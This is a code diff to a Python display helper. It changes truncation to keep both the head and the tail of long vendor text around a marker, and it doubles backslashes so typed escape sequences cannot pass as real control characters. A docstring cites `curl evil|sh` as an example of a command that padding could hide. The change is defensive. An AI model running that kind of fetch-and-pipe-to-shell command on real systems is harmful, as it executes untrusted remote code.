@@ -70,9 +70,14 @@ _SCOPE = re.compile(r"\A[a-z]{1,32}\Z")
 # What a failure detail may carry to a phone screen.
 _DETAIL_LIMIT = 240
 
-# Appended when `_shown` cuts vendor text, so a shortened record reads as one
+# Put where `_shown` cuts vendor text, so a shortened record reads as one
 # rather than as the vendor's whole answer (#305).
-_CUT_MARKER = "(truncated)"
+_CUT_MARKER = " (truncated) "
+
+# How much of a cut text is its head; the rest of `_DETAIL_LIMIT` is its tail
+# (#353). A head alone let padding at the front push the command out of view,
+# and an approved command's last characters are the ones that run.
+_CUT_HEAD = 160
 
 # #361 round 1 review, M1. What an `abandoned` row's `detail` says, and what
 # `PluginsFailed("shutting_down", ...)` says when the runner closed before any
@@ -526,8 +531,20 @@ def _shown(text: str) -> str:
     already-cut text can only lengthen it, never split a raw escape
     sequence, because none is left raw to split. `_CUT_MARKER` says a record
     was shortened, so it reads as a cut rather than as the vendor's whole
-    answer.
+    answer, and it sits between a head and a tail (#353): 240 spaces and then
+    `curl evil|sh` cut to a head alone read `approved: (truncated)` once a
+    phone collapsed the spaces.
+
+    A backslash is doubled before the escaping (#353), here and not in
+    `display_name`, whose other callers show folder names where a doubled
+    backslash would misreport the name. Undoubled, vendor text typing the six
+    characters of an escape rendered exactly as the control it spells.
     """
     if len(text) <= _DETAIL_LIMIT:
-        return display_name(text)
-    return display_name(text[:_DETAIL_LIMIT]) + _CUT_MARKER
+        return _escaped(text)
+    tail = _DETAIL_LIMIT - _CUT_HEAD
+    return _escaped(text[:_CUT_HEAD]) + _CUT_MARKER + _escaped(text[-tail:])
+
+
+def _escaped(text: str) -> str:
+    return display_name(text.replace("\\", "\\\\"))
